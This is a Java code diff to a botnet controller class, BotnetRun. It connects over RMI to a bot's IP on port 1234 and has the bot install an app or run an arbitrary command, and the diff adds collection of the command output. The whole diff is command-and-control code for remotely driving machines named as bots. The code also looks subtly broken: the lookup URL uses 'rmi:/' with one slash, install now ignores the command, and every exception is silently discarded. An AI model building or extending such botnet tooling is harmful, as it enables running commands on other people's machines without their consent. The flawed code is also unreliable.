@@ -9,6 +9,7 @@ import java.net.MalformedURLException;
 import java.rmi.Naming;
 import java.rmi.NotBoundException;
 import java.rmi.RemoteException;
+import java.util.ArrayList;
 import java.util.logging.Level;
 import java.util.logging.Logger;
 import model.IBotnet;
@@ -21,6 +22,7 @@ public class BotnetRun extends Thread{
     private String ip;
     private String cmd;
     private String type;
+    private ArrayList <String> return_string;
     public BotnetRun(String ip,String type, String cmd){
         this.ip = ip;
         this.type = type;
@@ -29,15 +31,19 @@ public class BotnetRun extends Thread{
     public void run(){
         try {
             IBotnet botnet = (IBotnet) Naming.lookup("rmi:/" + this.ip + ":" + "1234" + "/BotnetRMI");
-            if (this.type.endsWith("install")){
-                botnet.installApp(cmd);
+            if (this.type.equals("install")){
+                this.return_string = botnet.installApp("");
             }
-            if (this.type.endsWith("run")){
-                botnet.runCommand(cmd);
+            if (this.type.equals("run")){
+                this.return_string = botnet.runCommand(cmd);
             }
-        } catch (NotBoundException | MalformedURLException | RemoteException ex) {
-            Logger.getLogger(BotnetRun.class.getName()).log(Level.SEVERE, null, ex);
+        } catch (Exception ex) {
+            this.return_string = null;
         }
+    }
+    
+    public ArrayList <String> get_values(){
+        return this.return_string;
     }
     
 }
